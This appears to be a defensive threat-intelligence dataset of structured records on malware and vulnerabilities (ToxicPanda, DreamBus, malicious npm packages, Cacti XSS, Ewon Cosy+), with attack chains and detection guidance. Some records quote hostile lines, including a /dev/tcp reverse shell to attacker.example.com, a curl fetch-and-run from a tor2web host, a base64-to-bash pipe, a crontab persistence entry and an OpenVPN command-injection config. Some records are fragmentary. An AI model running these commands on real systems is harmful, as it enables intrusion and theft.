attack_chain.action: Dropper script creates scheduled task for persistence and writes loader and config files.
attack_chain.leads_to: Scheduled execution of loader

attack_chain.action: Scheduled task runs loader script, which decrypts and executes the PowerMagic backdoor.
attack_chain.leads_to: Backdoor execution

attack_chain.action: PowerMagic backdoor establishes C2 communication, receives commands, and exfiltrates data.
attack_chain.leads_to: Deployment of additional frameworks

attack_chain.action: CommonMagic modular framework is deployed for further espionage, using named pipes for inter-module communication.
attack_chain.leads_to: Ongoing espionage and data theft

behavioral_signatures: LNK files in ZIP/RAR archives that download and execute remote MSI installers via msiexec.exe
MSI installers dropping encrypted payloads (e.g., service_pack.dat) and VBS scripts (e.g., runservice_pack.vbs) to %APPDATA%/WinEventCom
Creation of scheduled tasks (e.g., 'WindowsActiveXTaskTrigger') pointing to VBS scripts in user profile directories
VBS/PowerShell loaders decrypting and executing payloads from config files using XOR or similar algorithms
PowerShell backdoors creating mutexes (e.g., 'WinEventCom'), maintaining persistent C2 communication, and executing attacker commands
Multiple executables in C:\ProgramData\CommonCommand\ communicating via named pipes for modular espionage
file_indicators: %APPDATA%/WinEventCom/service_pack.dat
%APPDATA%/WinEventCom/runservice_pack.vbs
%APPDATA%/WinEventCom/manutill.vbs
%APPDATA%/WinEventCom/config
C:\ProgramData\CommonCommand\*
network_indicators: Persistent outbound connections to attacker-controlled C2 servers from PowerShell processes
Unusual PowerShell network activity originating from user profile directories
Data exfiltration over HTTP/S from %APPDATA%/WinEventCom or C:\ProgramData\CommonCommand\
detection_knowledge.how_to_detect: Monitor for LNK files in email attachments or archives that reference remote MSI installers and invoke msiexec.exe. Flag MSI installations that drop encrypted payloads or scripts to user profile directories, especially %APPDATA%/WinEventCom. Detect creation of scheduled tasks (e.g., 'WindowsActiveXTaskTrigger') that execute scripts from %APPDATA%. Alert on PowerShell or VBS scripts that decrypt and execute code from local config files using XOR or similar algorithms. Look for mutex creation named 'WinEventCom' and persistent C2 communication from PowerShell processes. Scan for multiple executables in C:\ProgramData\CommonCommand\ that communicate via named pipes and perform modular espionage functions.

package_info.package_versions: Not specified (all versions with vulnerable report_admin.php and host.php code)
package_info.why_malicious: Cacti is vulnerable due to improper handling of user-supplied input in the device name and description fields. The application fails to sanitize or escape these fields before rendering them in the admin reporting interface, enabling attackers to inject persistent JavaScript payloads (stored XSS) that execute in the browser of privileged users. This allows for session hijacking, privilege escalation, and further compromise of the application.

execution_context.trigger: At runtime, when an admin user views the reports_admin.php page
required_permissions: filesystem (write to DB via web interface)

malicious_snippets.code_behavior: At runtime, when an admin views reports_admin.php, the code retrieves the $title and $description fields from the database (populated by user input), concatenates them, and outputs the result directly into the HTML response without escaping, resulting in execution of any embedded JavaScript payloads in the admin's browser.

malice_analysis.why_suspicious: Directly outputting user-controlled data into HTML without any escaping or sanitization allows attackers to inject and execute arbitrary JavaScript in the context of the victim's session, leading to stored XSS.
malice_analysis.violated_expectations: Normal behavior requires all user-supplied data to be escaped or sanitized before rendering in the browser to prevent XSS. Here, the application fails to apply any output encoding or validation.
malice_analysis.similar_legitimate_use: Concatenating and displaying database fields is common, but only when proper output encoding (e.g., htmlspecialchars in PHP) is applied to prevent code execution.
key_indicators: Absence of output escaping or sanitization functions (e.g., htmlspecialchars, htmlentities)
Direct concatenation and output of user-controlled variables into HTML
Rendering of device name/description fields in privileged admin interface

execution_context.trigger: User input (device name set via host.php), then at runtime when admin views reports_admin.php
execution_context.file_location: host.php (device name input form, stored in DB)
required_permissions: web application access (authenticated user with Sites/Devices/Data permissions)

malicious_snippets.code_snippet: <script>alert('XSS');</script>
malicious_snippets.code_behavior: At input time, an attacker submits a device name containing a <script> tag via host.php. When an admin later views the reports_admin.php page, the malicious payload is retrieved from the database and rendered unescaped in the HTML, causing the JavaScript to execute in the admin's browser.

malice_analysis.why_suspicious: Device names should be treated as plain text and never allow embedded HTML or JavaScript. Accepting and rendering such input enables stored XSS attacks.
malice_analysis.violated_expectations: Normal device name input should be validated and encoded before storage and output. Here, arbitrary HTML/JS is accepted and rendered, violating input validation and output encoding best practices.
malice_analysis.similar_legitimate_use: There is no legitimate use case for allowing executable code in device name fields; these should always be plain text.
key_indicators: Presence of <script> or other HTML tags in user-supplied input
Lack of input validation or output encoding on device name field
Execution of user-supplied JavaScript in admin context

attack_chain.action: An attacker with authenticated access submits a device name containing a malicious JavaScript payload via host.php.
attack_chain.leads_to: The malicious payload is stored in the database.

attack_chain.action: An admin user visits reports_admin.php, which retrieves and renders the device name/description fields from the database without escaping.
attack_chain.leads_to: The malicious JavaScript executes in the admin's browser (stored XSS).

attack_chain.action: The malicious JavaScript executes in the context of the admin session, enabling account takeover, data theft, or further attacks.
attack_chain.leads_to: Final goal: compromise of admin account or further exploitation.

behavioral_signatures: User-supplied input rendered in HTML responses without escaping or sanitization
Presence of <script> or other HTML tags in device name or description fields in the database
Execution of JavaScript in admin interface sourced from database fields
file_indicators: report_admin.php (concatenation and direct output of $title and $description variables)
host.php (device name input form lacking input validation or sanitization)
network_indicators: HTTP POST requests to /cacti/host.php with device names containing HTML or JavaScript code
Subsequent GET requests to /cacti/reports_admin.php resulting in script execution in the browser
detection_knowledge.how_to_detect: Monitor for user-supplied input fields (such as device name) that are rendered in HTML responses without proper escaping or sanitization. Scan database fields for suspicious patterns such as <script> tags or other HTML/JS content. Use web application firewalls (WAF) to detect and block requests containing potential XSS payloads. Review source code for direct output of user-controlled variables into HTML without encoding. Monitor browser console logs and security events for unexpected script execution in admin interfaces.

package_info.why_malicious: ToxicPanda is a banking trojan that abuses Android accessibility services to steal sensitive financial information, intercept one-time passwords (OTPs), bypass two-factor authentication (2FA), and enable remote device control for fraudulent transactions. It communicates with a command-and-control (C2) infrastructure using hardcoded domains, employs AES encryption with a hardcoded key, and registers infected devices for botnet management. Its primary purpose is to facilitate account takeover (ATO) and financial theft by automating unauthorized banking transactions.

execution_context.trigger: runtime (after installation, upon user granting accessibility permissions)
execution_context.file_location: Android app main service (background service, e.g., MainService.java)

malicious_snippets.code_behavior: At runtime, after the user grants accessibility permissions, the code starts a remote control service, monitors user input, and intercepts screen overlays, resulting in the ability to capture credentials and enable remote device control for fraudulent actions.

malice_analysis.why_suspicious: Persistent use of accessibility services to monitor user input and enable remote control is highly atypical for legitimate apps and is a common technique in banking malware for credential theft and device takeover.
malice_analysis.violated_expectations: Legitimate apps use accessibility services for user assistance, not for continuous surveillance or remote control that can lead to credential theft or unauthorized actions.
malice_analysis.similar_legitimate_use: Screen readers or accessibility tools for users with disabilities may use these services, but always with clear user consent, transparency, and without remote control features.
key_indicators: Continuous accessibility service activation
Background service initiating remote control logic
Monitoring user input outside the app's context
Intercepting screen overlays to capture sensitive data

execution_context.trigger: runtime (upon receiving SMS or notification event)

malicious_snippets.code_behavior: At runtime, upon receiving an SMS message, the code checks if the message contains an OTP, and if so, exfiltrates the OTP content to the C2 server, enabling bypass of two-factor authentication and facilitating account takeover.

malice_analysis.why_suspicious: Intercepting and exfiltrating OTPs from SMS messages is a hallmark of banking trojans, as legitimate apps should never access or transmit OTPs externally.
malice_analysis.violated_expectations: Normal apps do not read or forward OTPs to external servers, especially without explicit user action.
malice_analysis.similar_legitimate_use: Some apps auto-fill OTPs for user convenience, but do not exfiltrate them or transmit them to remote servers.
key_indicators: SMS interception logic in broadcast receiver
Pattern matching for OTPs in SMS content
Network exfiltration of sensitive SMS data to C2

execution_context.trigger: runtime (on app startup or C2 command)

malicious_snippets.code_behavior: At runtime, on app startup or upon receiving a C2 command, the code encrypts the device ID using a hardcoded AES key and sends it via HTTPS POST to a hardcoded C2 domain, resulting in device registration for botnet management and monitoring.

malice_analysis.why_suspicious: The use of hardcoded C2 domains, static AES encryption keys, and device registration is characteristic of botnet malware, enabling persistent remote control and tracking.
malice_analysis.violated_expectations: Legitimate apps do not register devices with external C2 infrastructure or use hardcoded encryption keys for exfiltration of device identifiers.
malice_analysis.similar_legitimate_use: Device registration with legitimate cloud services is possible, but always with user consent, secure key management, and transparent privacy policies.
key_indicators: Hardcoded C2 domain list in code
AES encryption in ECB mode with static key
Device ID exfiltration to remote server

malicious_snippets.code_behavior: At runtime, upon receiving a setCommandStyle command from the C2 server, the code updates the primary C2 domain, enabling dynamic reconfiguration of the C2 infrastructure to evade takedowns and maintain persistence.

malice_analysis.why_suspicious: Dynamic C2 reconfiguration via remote command is a technique used by malware to evade domain takedowns and maintain uninterrupted control.
malice_analysis.violated_expectations: Legitimate apps do not accept unauthenticated remote commands to change their backend infrastructure or communication endpoints.
malice_analysis.similar_legitimate_use: Enterprise apps may update endpoints via secure, authenticated channels, but not through arbitrary C2 commands.
key_indicators: Remote C2 domain update logic in command handler
Command-based modification of network infrastructure

execution_context.trigger: runtime (on C2 command for fraudulent transaction)

malicious_snippets.code_behavior: At runtime, upon receiving a fraudTransaction command from the C2 server, the code uses accessibility services to automate interactions with the banking app and confirm unauthorized transactions up to €10,000, resulting in direct financial theft.

malice_analysis.why_suspicious: Automating banking app interactions to perform unauthorized transactions is a direct financial threat and a clear indicator of banking malware.
malice_analysis.violated_expectations: Normal apps do not automate or confirm banking transactions without explicit user action and consent.
malice_analysis.similar_legitimate_use: Accessibility automation may be used for testing or legitimate automation, but never for financial operations or without user knowledge.
key_indicators: Accessibility-driven automation of banking app UI
Remote command execution for fraudulent financial transactions

attack_chain.action: User is tricked into sideloading the malicious APK, which masquerades as a legitimate app (e.g., Chrome, VISA).
attack_chain.leads_to: Malware installation and permission request

attack_chain.action: Malware requests and abuses accessibility services to gain persistent control and surveillance.
attack_chain.leads_to: Remote device control and credential theft

attack_chain.action: Malware intercepts incoming SMS messages to capture OTPs and 2FA codes.
attack_chain.leads_to: Exfiltration of OTPs to C2

attack_chain.action: Malware registers the infected device with the C2 infrastructure using encrypted device ID.
attack_chain.leads_to: Botnet management and monitoring

attack_chain.action: C2 can issue commands to update C2 domains or initiate fraudulent transactions.
attack_chain.leads_to: Dynamic C2 evasion and financial theft

behavioral_signatures: Abuse of Android accessibility services for persistent remote control and surveillance
Interception and exfiltration of SMS/OTP messages to external servers
Device registration with hardcoded C2 domains using AES-encrypted payloads
Dynamic C2 domain updates via unauthenticated remote commands
Automated banking app interactions and transaction confirmations via accessibility services
file_indicators: APK with package name mimicking legitimate brands (e.g., Chrome, VISA)
Presence of hardcoded C2 domains (dksu.top, mixcom.one, freebasic.cn) in app binary
AES key '0623U2SKT3YY3QB9P' present in code or resources
network_indicators: HTTPS requests to ctrl.dksu.top, ctrl.mixcom.one, ctrl.freebasic.cn
WebSocket connections to the above domains
Outbound traffic containing AES-encrypted device IDs
detection_knowledge.how_to_detect: Monitor for Android apps requesting accessibility services without clear justification, especially those sideloaded and mimicking popular brands. Detect behaviors involving SMS interception and exfiltration of OTPs. Scan APKs for hardcoded C2 domains and static AES keys. Monitor network traffic for connections to known C2 domains and WebSocket usage. Flag apps that automate banking app interactions or perform remote-controlled transactions via accessibility services.

package_info.package_name: Unknown (malicious npm package used by Jade Sleet/TraderTraitor)
package_info.package_versions: Unknown (malicious versions posted just before repository invitations)
package_info.why_malicious: The package is explicitly crafted to deliver a second-stage malware payload to victims' computers. It is typically distributed as a dependency in software shared via targeted social engineering, with the primary objective of compromising the victim's system by downloading and executing additional malicious code during installation.

malicious_snippets.code_behavior: During postinstall, the code initiates an HTTPS request to download a remote executable, writes the binary to disk as payload.exe, and then executes it using child_process, resulting in remote code execution and system compromise.

malice_analysis.why_suspicious: The code downloads and executes a remote binary during the npm package installation process, which is a well-known malware delivery technique and is almost never justified in legitimate npm packages.
malice_analysis.violated_expectations: Legitimate npm packages do not download and execute external binaries as part of their installation, especially from untrusted or undocumented domains.
malice_analysis.similar_legitimate_use: Some legitimate packages (e.g., native modules) may download platform-specific binaries, but these are fetched from trusted, documented sources and are not executed blindly without user awareness.
key_indicators: Presence of a postinstall script in package.json that initiates network requests
Download of an executable file from a non-standard, external domain during installation
Creation of a new executable file (e.g., payload.exe) in the project directory
Use of child_process or similar APIs to execute a downloaded file immediately after retrieval

attack_chain.action: Threat actor initiates social engineering by contacting the target and inviting them to a GitHub repository or sending a malicious npm package directly.
attack_chain.leads_to: Victim clones repository or installs npm package.

attack_chain.action: Victim installs the npm package, triggering the postinstall script.
attack_chain.leads_to: Malicious code executes on victim's machine.

attack_chain.action: Malicious code downloads and executes a second-stage malware payload.
attack_chain.leads_to: Victim's system is compromised by the second-stage malware.

behavioral_signatures: npm package postinstall scripts that initiate outbound network connections
Downloading and writing executable files from non-standard or untrusted domains during installation
Use of child_process or similar APIs to execute files as part of the install lifecycle
file_indicators: package.json containing suspicious or undocumented postinstall scripts
Unexpected executable files (e.g., payload.exe) appearing in the project directory immediately after npm install
network_indicators: Outbound HTTPS requests to domains not associated with npm, the package author, or the package's documented functionality
Connections to known malicious infrastructure, such as domains previously attributed to Jade Sleet/TraderTraitor
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that make network requests or download and execute binaries. Flag packages that use child_process to run files during installation. Alert on unexpected outbound connections to untrusted domains during npm install, especially those not referenced in the package's documentation. Review package.json for undocumented or suspicious scripts, and audit new dependencies introduced via unsolicited invitations or social engineering.

package_info.why_malicious: These packages exploit the dependency confusion vulnerability in npm to execute malicious code automatically upon installation or import. Their primary objectives are to exfiltrate highly sensitive system files (such as /etc/shadow and .bash_history), fingerprint the host environment, and establish unauthorized remote access via reverse shell. These behaviors are never legitimate in npm packages and represent clear, intentional malicious activity.

malicious_snippets.code_behavior: During postinstall, the code reads the /etc/shadow file, transmits its contents via HTTPS POST to a hardcoded external server, resulting in credential exfiltration.

malice_analysis.why_suspicious: Accessing and exfiltrating /etc/shadow is a direct attempt to steal system password hashes, which is highly sensitive and never required by legitimate npm packages.
malice_analysis.violated_expectations: Normal npm packages do not access or transmit system password files such as /etc/shadow during installation or at any point.
malice_analysis.similar_legitimate_use: System administration or backup tools may read /etc/shadow, but never as part of a package installation process or for exfiltration to an external server.
key_indicators: Reads /etc/shadow file
Sends file contents to hardcoded external server during install
Uses HTTPS POST in postinstall script

malicious_snippets.code_behavior: During postinstall, the code reads the user's .bash_history file, sends its contents via HTTPS POST to a remote server, resulting in exfiltration of command history.

malice_analysis.why_suspicious: Exfiltrating .bash_history exposes sensitive user commands, credentials, and operational context, which is a clear privacy and security violation.
malice_analysis.violated_expectations: Legitimate npm packages do not access or transmit user shell history files such as .bash_history during installation.
malice_analysis.similar_legitimate_use: Forensics or backup tools may access .bash_history, but not npm packages during install, and never for exfiltration.
key_indicators: Reads .bash_history file
Transmits user command history to external server
Uses HTTPS POST in postinstall script

malicious_snippets.code_behavior: During postinstall, the code collects host fingerprinting data (hostname, IP addresses, current working directory), sends this information as JSON via HTTPS POST to a remote server, enabling attacker reconnaissance.

malice_analysis.why_suspicious: Collecting and exfiltrating host fingerprinting data during installation is a common precursor to targeted attacks and is not required for normal package operation.
malice_analysis.violated_expectations: Legitimate npm packages do not fingerprint the host or send system information externally during installation.
malice_analysis.similar_legitimate_use: Telemetry or analytics tools may collect some system info, but only with user consent and transparency, never silently during install.
key_indicators: Collects hostname, IP addresses, and current directory
Sends system fingerprint data to external server
Uses HTTPS POST in postinstall script

malicious_snippets.code_snippet:
const { exec } = require('child_process');
exec('bash -i >& /dev/tcp/attacker.example.com/4444 0>&1');
malicious_snippets.code_behavior: During postinstall, the code executes a shell command to open a reverse shell connection to a remote host, granting the attacker remote command execution on the victim system.

malice_analysis.why_suspicious: Opening a reverse shell provides attackers with direct remote access and control, which is never legitimate in the context of npm package installation.
malice_analysis.violated_expectations: No legitimate npm package should execute shell commands or establish remote shell connections during installation.
malice_analysis.similar_legitimate_use: There is no legitimate use for reverse shells in npm package installation scripts.
key_indicators: Executes shell command via child_process.exec
Connects to external host on non-standard port (4444)
Establishes reverse shell during install

attack_chain.action: Malicious package is installed as a result of dependency confusion attack.
attack_chain.leads_to: Triggers execution of postinstall scripts defined in package.json.

attack_chain.action: Postinstall script executes and fingerprints the host by collecting hostname, IP addresses, and current working directory.
attack_chain.leads_to: Attacker receives system information for further targeting.

attack_chain.action: Postinstall script exfiltrates sensitive files, including /etc/shadow and .bash_history, to the attacker's server.
attack_chain.leads_to: Attacker obtains credentials and user command history.

attack_chain.action: Postinstall script opens a reverse shell to the attacker's server, granting remote access.
attack_chain.leads_to: Attacker gains interactive remote shell access to the victim system.

behavioral_signatures: npm package postinstall scripts that access or read sensitive files such as /etc/shadow or .bash_history
Exfiltration of sensitive files or user data via HTTPS POST requests during package installation
Host fingerprinting (collection of hostname, IP addresses, working directory) and network exfiltration in install scripts
Execution of shell commands or creation of reverse shell connections during npm install
file_indicators: package.json with suspicious postinstall script entries
JavaScript code referencing /etc/shadow or .bash_history
Use of child_process.exec or similar APIs with network destinations in install scripts
network_indicators: Outbound HTTPS POST requests to attacker.example.com or other unknown domains during npm install
TCP connections to non-standard ports (e.g., 4444) initiated during package installation
detection_knowledge.how_to_detect: Monitor npm package installations for postinstall scripts that access sensitive files or execute shell commands. Flag any package that attempts to read /etc/shadow, .bash_history, or collects host fingerprinting data and sends it to external servers. Detect outbound network connections to unknown domains or non-standard ports (such as 4444) during package installation. Review package.json for suspicious postinstall entries and scan code for use of child_process.exec or similar APIs that initiate network connections.

package_info.why_malicious: The package is a malicious .NET executable distributed via fake browser update and ChatGPT download campaigns. It combines credential stealer and ransomware functionality, exfiltrates sensitive data (including browser credentials and files), encrypts user files, drops ransom notes, and establishes persistence via registry modification. The executable is heavily obfuscated to evade detection and analysis, and communicates with C2 servers using encrypted HTTPS channels.

malicious_snippets.code_behavior: At user-execution, the code initiates browser data theft, exfiltrates sensitive information to a remote C2 server via HTTPS, encrypts user files in target directories, and drops a ransom note in each affected folder, resulting in credential loss, data exfiltration, and file inaccessibility.

malice_analysis.why_suspicious: This code combines credential and data theft, file encryption, and ransom note dropping, which are hallmark behaviors of stealer and ransomware malware. The sequence of actions is coordinated and malicious in intent.
malice_analysis.violated_expectations: A legitimate browser update or ChatGPT installer should not access or steal browser data, exfiltrate information to external servers, or encrypt user files and demand ransom.
malice_analysis.similar_legitimate_use: Legitimate installers may access the filesystem to install application files, but never to steal user data, exfiltrate credentials, or encrypt files for ransom.
key_indicators: Simultaneous invocation of data theft, exfiltration, and file encryption routines
Dropping ransom notes in user directories
Execution of stealer and ransomware logic at program startup

malicious_snippets.code_behavior: At runtime after initial execution, the code establishes an encrypted HTTPS connection to a command and control server and sends stolen data, resulting in credential and information exfiltration to an external attacker.

malice_analysis.why_suspicious: The code transmits sensitive user data to an external C2 server over HTTPS, a common exfiltration technique in malware. The use of encrypted channels and obfuscated endpoints further indicates malicious intent.
malice_analysis.violated_expectations: Legitimate installers should not transmit user credentials or browser data to unknown external servers, especially not immediately after execution.
malice_analysis.similar_legitimate_use: Some legitimate software may check for updates or send anonymized telemetry, but not exfiltrate sensitive browser or credential data to untrusted domains.
key_indicators: HTTPS POST requests to hardcoded or obfuscated C2 domains
Transmission of browser credentials and sensitive data
Use of encrypted network channels for exfiltration

malicious_snippets.code_behavior: At runtime after data exfiltration, the code iterates through user directories, encrypts files, and writes a ransom note (read_it.txt) in each affected folder, resulting in user data inaccessibility and ransom demand.

malice_analysis.why_suspicious: Encrypting user files and dropping ransom notes is a classic ransomware behavior. The code targets user directories and ensures the ransom note is visible in each affected location.
malice_analysis.violated_expectations: No legitimate installer or update process should encrypt user files or demand ransom for file recovery.
malice_analysis.similar_legitimate_use: Encryption may be used by backup or security software, but not in conjunction with ransom notes or after data theft.
key_indicators: File encryption in user directories
Automated creation of ransom note (read_it.txt) in each encrypted folder
Targeted iteration over user files for encryption

malicious_snippets.code_behavior: At runtime during the persistence phase, the code creates a registry entry under HKCU\Software\Microsoft\Windows\CurrentVersion\Run to ensure the malware runs on system startup, resulting in persistent presence and repeated execution after reboot.

malice_analysis.why_suspicious: Malware commonly uses registry keys to maintain persistence across reboots, especially in conjunction with data theft and ransomware activity.
malice_analysis.violated_expectations: Legitimate installers may register for auto-start, but not in combination with credential theft, data exfiltration, and ransomware behaviors.
malice_analysis.similar_legitimate_use: Some legitimate applications (e.g., antivirus, cloud sync) use auto-start registry keys, but not alongside malicious actions.
key_indicators: Registry modification for persistence (HKCU\...\Run)
Persistence mechanism implemented in context of stealer and ransomware activity

attack_chain.action: Victim is lured to a fake browser update or ChatGPT download site and downloads setupbrowser.exe.
attack_chain.leads_to: Execution of malicious payload

attack_chain.action: User executes setupbrowser.exe, which initiates stealer and ransomware logic.
attack_chain.leads_to: Data theft, exfiltration, and file encryption

attack_chain.action: Malware steals browser and sensitive data, then exfiltrates it to a remote C2 server via HTTPS.
attack_chain.leads_to: Data loss and exposure

attack_chain.action: Malware encrypts user files and drops ransom notes (read_it.txt) in affected folders.
attack_chain.leads_to: Ransom demand and data inaccessibility

attack_chain.action: Malware establishes persistence by creating a registry key for auto-start under HKCU\Software\Microsoft\Windows\CurrentVersion\Run.
attack_chain.leads_to: Continued presence and repeated attacks

behavioral_signatures: Executable distributed as fake browser or ChatGPT update
Stealing browser data and credentials at runtime
Exfiltration of sensitive data via HTTPS POST to unknown or suspicious domains
File encryption in user directories and automated ransom note (read_it.txt) creation
Registry modification for persistence under HKCU\Software\Microsoft\Windows\CurrentVersion\Run
file_indicators: setupbrowser.exe (malicious .NET binary, often in Downloads or Temp folders)
read_it.txt (ransom note dropped in encrypted folders)
network_indicators: HTTPS POST requests to domains such as www.igrejaatos2.org
Encrypted or obfuscated C2 communication over HTTPS
detection_knowledge.how_to_detect: Monitor for downloads and execution of suspicious executables named setupbrowser.exe, especially from non-standard update or ChatGPT sites. Detect unauthorized access to browser credential stores, unexpected outbound HTTPS connections to untrusted or hardcoded domains (e.g., www.igrejaatos2.org), and the creation of ransom notes (read_it.txt) in user directories. Watch for registry modifications establishing persistence for unknown executables under HKCU\Software\Microsoft\Windows\CurrentVersion\Run. Use endpoint protection to flag obfuscated .NET binaries exhibiting stealer and ransomware behaviors, and correlate file, network, and registry activity for comprehensive detection.

package_info.package_versions: Varies (see individual threats: Mal.Metrica - WordPress plugins, Wpeeper - repackaged Android apps, GoldDigger/GoldFamily - Android/iOS apps, DarkGate - Windows binaries)
package_info.why_malicious: These packages and binaries are malicious because they inject deceptive scripts, establish covert command-and-control channels, exfiltrate sensitive biometric and identification data, and enable full remote access and data theft. They exploit legitimate platforms (WordPress, Android, iOS, Windows) to compromise users, evade detection, and facilitate monetization, identity theft, and further attacks.

execution_context.trigger: runtime (when a WordPress site is loaded or visited by a user)
execution_context.file_location: Injected into legitimate WordPress plugin files (e.g., tagDiv Composer, Popup Builder, WP Go Maps, Beautiful Cookie Consent Banner)
required_permissions: network (to load external scripts and perform redirections)

malicious_snippets.code_snippet: Injected JavaScript that loads a Yandex.Metrica analytics script, displays a fake CAPTCHA prompt to the user, and upon user interaction, redirects the browser to attacker-controlled malicious domains.
malicious_snippets.code_behavior: At runtime (when a user visits the infected WordPress site), the code injects a Yandex.Metrica script into the page, displays a deceptive CAPTCHA prompt, and upon user interaction, redirects the user to a malicious domain, resulting in click fraud and potential malware delivery.

malice_analysis.why_suspicious: The code is injected into unrelated plugin files and performs user deception by displaying a fake CAPTCHA and redirecting users to known malicious domains, which is not part of legitimate plugin functionality.
malice_analysis.violated_expectations: Legitimate WordPress plugins should not inject third-party analytics scripts in this manner, nor should they display deceptive prompts or redirect users to untrusted external domains without user consent.
malice_analysis.similar_legitimate_use: Legitimate plugins may use analytics scripts or CAPTCHA prompts, but these are implemented transparently, with user consent, and never redirect users to malicious sites.
key_indicators: Presence of Yandex.Metrica script injected into unrelated plugin files
Display of a fake CAPTCHA prompt not associated with plugin features
Redirection to domains known for malicious activity
Modification of plugin files outside of normal update processes

execution_context.trigger: runtime (Android app execution after installation, especially in repackaged apps from unofficial sources)

malicious_snippets.code_snippet: Malicious code within repackaged Android apps that establishes command-and-control (C2) communication by routing traffic through compromised WordPress relay servers, enabling remote attacker control and evasion of detection.
malicious_snippets.code_behavior: At runtime (after installation and app launch), the code establishes covert C2 communication by sending encrypted traffic through hacked WordPress sites acting as relays, allowing remote attackers to issue commands, control the device, and evade detection by security tools.

malice_analysis.why_suspicious: The use of compromised WordPress sites as C2 relays is a known evasion technique, and the code is present in repackaged apps distributed outside official app stores, increasing the risk of undetected compromise.
malice_analysis.violated_expectations: Legitimate Android apps should not communicate with unknown or compromised servers, nor should they establish covert C2 channels or request excessive permissions unrelated to their stated functionality.

malice_analysis.violated_expectations: Legitimate apps should only collect biometric or identification data with explicit user consent, for a clear and disclosed purpose, and must securely handle and store such data without unauthorized transmission.

package_info.package_name: DreamBus (delivered via reketed script exploiting Apache RocketMQ CVE-2023-33246)

package_info.why_malicious: The DreamBus malware, delivered through exploitation of the RocketMQ remote code execution vulnerability (CVE-2023-33246), installs a botnet agent that downloads additional payloads, establishes persistence mechanisms, and launches Monero cryptocurrency mining operations via covert channels (such as TOR), all without user knowledge or consent. This results in unauthorized resource hijacking, persistent compromise, and covert network activity.

execution_context.trigger: remote code execution via update configuration API

malicious_snippets.code_snippet: curl -o /tmp/reketed http://tor2web.in/abc123/reketed; chmod +x /tmp/reketed; /tmp/reketed
malicious_snippets.code_behavior: During remote code execution via the RocketMQ configuration update API, the code downloads a malicious bash script from a TOR proxy using curl, writes it to /tmp, sets executable permissions, and executes it, resulting in initial malware installation.

malice_analysis.why_suspicious: Arbitrary remote download and execution of a script from an anonymous TOR proxy is a classic malware delivery technique, designed to evade attribution and detection.
malice_analysis.violated_expectations: Normal RocketMQ configuration updates should not trigger arbitrary shell command execution or download and run external scripts from untrusted sources.
malice_analysis.similar_legitimate_use: Automated update scripts may download binaries, but never via unauthenticated RCE or from TOR proxies, and always with integrity checks and user/admin approval.
key_indicators: Use of curl to download from a TOR proxy domain
Execution of a newly downloaded file in /tmp
No user interaction or validation of the downloaded script
Command injection via configuration API

malice_analysis.similar_legitimate_use: Rare in legitimate software; only in tightly controlled update mechanisms with strong authentication and integrity checks.

malice_analysis.why_suspicious: Fetching and executing a binary from a TOR hidden service is highly indicative of malware attempting to evade detection, attribution, and network monitoring.
malice_analysis.violated_expectations: No legitimate process should download and execute code from the dark web or TOR hidden services, especially without validation.
malice_analysis.similar_legitimate_use: None in standard enterprise environments; only in highly specialized, controlled research or penetration testing scenarios.
key_indicators: Use of curl to access a TOR hidden service (.onion address)
Execution of a downloaded ELF binary in /tmp
No user or administrator approval or validation
Network traffic to TOR endpoints

malicious_snippets.code_snippet: echo <base64_string> | base64 -d | bash
malicious_snippets.code_behavior: At runtime, the DreamBus binary decodes base64-encoded bash scripts using echo and base64 -d, then pipes the decoded script to bash for execution, resulting in the download of additional modules, establishment of persistence, or initiation of mining operations.

malice_analysis.why_suspicious: Use of base64 encoding to obfuscate and execute further payloads is a common malware evasion technique, designed to bypass static analysis and detection.
malice_analysis.violated_expectations: Legitimate software does not self-decode and execute hidden scripts at runtime without transparency or user awareness.
malice_analysis.similar_legitimate_use: Rarely, some installers may use base64 for packaging, but not for hidden runtime execution of additional payloads.
key_indicators: Obfuscated payload delivery using base64 encoding
Chained script execution via bash
No transparency or logging to the system owner
Dynamic code execution at runtime

malicious_snippets.code_snippet: echo '* * * * * /tmp/dreambus' >> /etc/crontab
malicious_snippets.code_behavior: After infection, the malware establishes persistence by appending a cron job to /etc/crontab that executes the DreamBus binary every minute, ensuring the malware is relaunched continuously.

malice_analysis.why_suspicious: Malware commonly uses cron jobs for persistence; adding jobs to /etc/crontab without user or administrator consent is a clear indicator of unauthorized activity.
malice_analysis.violated_expectations: Legitimate cron jobs are managed by system administrators and are not created by arbitrary binaries or scripts without oversight.
malice_analysis.similar_legitimate_use: System maintenance scripts may use cron, but only with explicit admin oversight and documentation.
key_indicators: Unauthorized modification of /etc/crontab
Frequent execution of a suspicious binary in /tmp
Persistence mechanism established outside normal IT processes

malice_analysis.similar_legitimate_use: Only in dedicated mining environments with explicit user approval and monitoring.

package_info.why_malicious: The Ewon Cosy+ firmware contains multiple critical vulnerabilities, including OS command injection via OpenVPN configuration, insecure web interface input handling leading to XSS, improper certificate management, and weak file permission controls. These flaws allow attackers to gain root access, execute arbitrary commands, decrypt sensitive data, steal credentials, and hijack VPN sessions, resulting in full compromise of industrial remote access infrastructure.

malicious_snippets.code_snippet:
script-security 2
up '/bin/sh -c "id; <attacker command>"'
malicious_snippets.code_behavior: At VPN connection establishment, the configuration enables user-defined scripts and executes a shell command as root, allowing arbitrary code execution and enabling the attacker to establish a reverse shell or run further payloads, resulting in full device compromise.

malice_analysis.why_suspicious: Allowing user-supplied OpenVPN configuration parameters to execute arbitrary shell commands as root is highly dangerous and enables attackers to gain full control over the device.
malice_analysis.violated_expectations: Normally, OpenVPN configuration uploads should be sanitized to prevent execution of arbitrary shell commands, especially with root privileges. User-uploaded configurations should not be able to alter script execution policies.
malice_analysis.similar_legitimate_use: Legitimate use of 'up' scripts in OpenVPN is for network interface setup by trusted administrators, but not with arbitrary user-supplied commands from uploaded files.
key_indicators: Presence of 'script-security 2' directive in uploaded OpenVPN configuration
Injection of 'up' parameter with shell command
Execution of shell commands as root during VPN session establishment
Lack of sanitization or validation on uploaded configuration files

malicious_snippets.code_snippet: <script>...malicious JavaScript loaded from attacker...</script>
malicious_snippets.code_behavior: During FTP login, the web interface fails to sanitize user input, allowing a cross-site scripting (XSS) payload to execute in the victim's browser, which loads additional JavaScript from an attacker-controlled server, captures plaintext credentials entered by the user, and exfiltrates them to the attacker's infrastructure.

malice_analysis.why_suspicious: Execution of attacker-controlled JavaScript in the admin or technician's browser enables theft of credentials and session tokens, leading to further compromise of the device and associated infrastructure.
malice_analysis.violated_expectations: Web interfaces should rigorously sanitize all user input and never allow arbitrary script execution in sensitive contexts such as login pages.
